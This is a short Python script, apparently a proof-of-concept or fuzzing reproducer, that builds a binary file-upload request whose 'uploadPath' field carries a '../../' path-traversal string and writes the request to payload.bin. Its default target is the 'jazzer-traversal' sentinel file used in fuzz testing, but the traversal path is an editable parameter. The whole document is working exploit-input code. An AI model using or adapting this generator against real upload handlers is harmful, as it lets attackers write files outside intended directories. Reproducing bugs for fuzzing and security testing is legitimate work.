import binascii


def create_payload(traversal_path="../../home/jazzer-traversal"):
    # Encode the dynamic traversal path
    traversal_bytes = traversal_path.encode("utf-8") + b"\x00"
    traversal_len = len(traversal_bytes) - 1
    traversal_len_hex = f"{traversal_len:02x}"

    # Full pre-traversal hex up to the length byte
    pre_traversal_hex = (
        "0000002102000000000102000a75706c6f61645061746800" + traversal_len_hex
    )

    # Dynamic traversal path itself
    traversal_hex = binascii.hexlify(traversal_bytes).decode()

    post_traversal_hex = (
        "087570"
        "6c6f616449640001300100236d756c74"
        "69706172742f666f726d2d646174613b"
        "20626f756e646172793d313233343501"
        "00ae2d2d31323334350d0a436f6e7465"
        "6e742d446973706f736974696f6e3a20"
        "666f726d2d646174613b206e616d653d"
        "2278223b0d0a0d0a790d0a2d2d313233"
        "34350d0a436f6e74656e742d44697370"
        "6f736974696f6e3a20666f726d2d6461"
        "74613b206e616d653d2266223b206669"
        "6c656e616d653d2266220d0a436f6e74"
        "656e742d547970653a20746578742f70"
        "6c61696e0d0a0d0a68656c6c6f20776f"
        "726c640d0a2d2d31323334352d2d0d0a"
    )

    full_hex = pre_traversal_hex + traversal_hex + post_traversal_hex
    payload = binascii.unhexlify(full_hex)

    return payload


# Save payload to a file
if __name__ == "__main__":
    traversal_string = "../../home/jazzer-traversal"  # Change this as needed
    with open("payload.bin", "wb") as f:
        f.write(create_payload(traversal_string))

    print("Payload saved to payload.bin with traversal path:", traversal_string)
